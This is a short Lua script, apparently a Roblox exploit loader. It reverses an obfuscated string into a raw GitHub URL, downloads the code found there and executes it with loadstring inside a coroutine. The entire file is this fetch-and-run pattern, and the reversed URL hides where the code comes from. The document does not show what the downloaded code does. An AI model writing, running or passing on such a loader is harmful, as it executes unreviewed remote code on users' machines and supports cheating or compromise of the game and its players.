local link, response = pcall(game.HttpGet, game, string.reverse'aul.niaM/ihcati/113vbuhretsam/lolytsed/moc.tnetnocresubuhtig.war//:sptth', true)
if not link then return error("Failed to access raw") end
local loads, err = coroutine.create(loadstring(response, '@desty#1821', '@GramxPersons#1111'))
if not loads then return error('Failed to load response') end
coroutine.resume(loads)